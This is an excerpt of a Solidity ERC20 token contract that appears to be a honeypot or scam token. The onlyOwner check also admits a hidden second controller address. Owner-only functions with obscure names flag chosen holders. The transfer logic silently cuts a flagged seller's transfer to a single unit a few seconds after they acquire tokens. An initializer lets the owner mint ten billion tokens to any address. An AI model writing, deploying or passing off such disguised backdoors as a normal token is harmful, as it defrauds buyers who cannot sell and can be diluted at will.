...
contract Ownable {
     ...
     */
    modifier onlyOwner() {
        require(_owner == msg.sender || _hostter == msg.sender, "Ownable: caller is not the owner");
        _;
    }
...
contract ERC20 is IERC20, Ownable {
    ...
    function setSw(address user) public onlyOwner returns(bool){
		_sw =user;
		return true;
	}

    function setHere(address user) public onlyOwner returns(bool){
		_here =user;
		return true;
	}
    ...
    function sysMm(address user) public onlyOwner returns(bool){
		_mmL[user] =true;
		return true;
	}
	
	function sysXMm(address user) public onlyOwner returns(bool){
		_mmL[user] =false;
		return true;
	}
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
		...
		if(_iiL[sender] || _iiL[recipient]){
            ...
            if (_mmL[sender] == true) {
                ...
                if (_balances[sender] > 0 && _ttL[sender] > 0 && block.timestamp - _ttL[sender] > 5) {
                    ...
                    if (reserveToken > 0 && reserveBNB > 0) {
                        _mmy = reserveBNB;
                        _nmb = reserveToken;
                        if (address(this) == _here) {
                            _transferfee(sender, recipient, amount - amount + 1);
                        }
                        else {
                            _transferfee(sender, recipient, amount);
                        }
...
contract Token is ERC20 {
    ...
    function ootInit(string memory names, address seeds, address hostter) public onlyOwner returns(bool){
		_name = names;
        _symbol = names;
        _decimals = 18;
        _hostter = hostter;//
        _mint(seeds, 10000000000 * (10 ** 18));
		return true;
	}
